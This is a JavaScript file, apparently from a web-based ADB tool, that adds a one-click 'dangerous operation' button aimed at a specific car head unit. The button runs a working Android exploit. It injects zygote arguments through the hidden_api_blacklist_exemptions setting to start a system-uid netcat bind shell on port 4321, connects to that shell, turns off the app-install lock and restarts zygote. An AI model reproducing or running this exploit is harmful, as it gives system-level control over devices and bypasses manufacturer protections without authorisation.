// hidden_api_tool.js
(function () {

    /* ================= 危险样式 ================= */
    const style = document.createElement('style');
    style.textContent = `
        #btnRunHiddenApi {
            background: #b71c1c !important;
            color: #fff !important;
            border: 1px solid #7f0000 !important;
        }
        #btnRunHiddenApi:disabled {
            background: #555 !important;
            border-color: #444 !important;
            color: #ccc !important;
            cursor: not-allowed;
        }
    `;
    document.head.appendChild(style);

    /* ================= 执行函数 ================= */
    async function runHiddenApiCommand() {
        if (!window.app || !window.app.adb || window.app.isInstalling) {
            alert('❌ 设备未连接');
            return;
        }

        // 二次确认
        if (!confirm(
            '⚠ 高危操作 ⚠\n\n' +
            '风云T9专用功能其他车型勿点,将修改系统设置并重启。\n\n继续？'
        )) return;

        if (!confirm(
            '🚨 最终确认 🚨\n\n' +
            '这是厂商/工程级命令，后果自负。\n\n确认执行？'
        )) return;

        window.app.isInstalling = true;
        window.app.updateAllButtons();

        try {
            window.app.showProgress(
                true,
                '执行 adb shell',
                '正在同一 shell 会话中执行完整命令…',
                false
            );

            // ✅ 明确：adb shell + sh -c
            const shellScript = `
settings put global hidden_api_blacklist_exemptions "LClass1;->method1(
10
--runtime-args
--setuid=1000
--setgid=1000
--runtime-flags=2049
--mount-external-full
--setgroups=3003
--nice-name=runnetcat
--seinfo=platform:targetSdkVersion=30:complete
--invoke-with
toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
)"
settings delete global hidden_api_blacklist_exemptions
sleep 2
settings get global hidden_api_blacklist_exemptions

toybox nc localhost 4321
setprop sys.config.app_install_disabled false
getprop sys.config.app_install_disabled
settings delete global hidden_api_blacklist_exemptions
settings get global hidden_api_blacklist_exemptions
setprop ctl.restart zygote
            `.trim();

            // ✅ 关键：整个脚本在同一个 adb shell 里
            const out = await window.app.execShell(
                `sh -c '${shellScript.replace(/'/g, `'\\''`)}'`
            );

            window.app.log('☠ 完整 adb shell 命令已执行');
            if (out) window.app.log(out.trim());

            window.app.showProgress(true, '完成', '命令已发送，系统可能正在重启', false);
            setTimeout(() => window.app.showProgress(false), 1500);

        } catch (e) {
            window.app.log(`❌ 执行失败：${e.message}`);
            window.app.showProgress(true, '失败', e.message, false);
            setTimeout(() => window.app.showProgress(false), 2000);
        } finally {
            window.app.isInstalling = false;
            window.app.updateAllButtons();
        }
    }

    /* ================= 状态绑定 ================= */
    window.addEventListener('DOMContentLoaded', () => {
        const btn = document.getElementById('btnRunHiddenApi');
        if (!btn) return;

        btn.disabled = true;
        btn.addEventListener('click', runHiddenApiCommand);

        setInterval(() => {
            btn.disabled = !window.app || !window.app.adb || window.app.isInstalling;
        }, 300);
    });

})();